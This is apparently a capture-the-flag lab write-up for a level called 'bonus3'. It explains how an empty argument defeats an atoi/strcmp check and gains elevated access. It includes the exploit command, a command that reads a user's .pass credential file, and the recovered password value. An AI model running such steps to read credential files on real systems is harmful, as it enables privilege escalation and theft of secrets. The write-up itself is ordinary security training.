get the binary on host
* `scp -P 4242 bonus3@192.168.56.107:./bonus3 ./binary/bonus3`

decompile using ghidras

Source are in source.c 

we need to have this condition check
* `fd != 0 && argc == 2 `
* `strcmp(buff_read, argv[1])  == 0`

since this happend
```c
	iVar2 = atoi(argv[1]);
	buff_read[iVar2] = '\0';
```
if `atoi(argv[1]) == 0`, `buff_read = ""`\
Well `atoi("") == 0`.

```
./bonus3 ''
cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```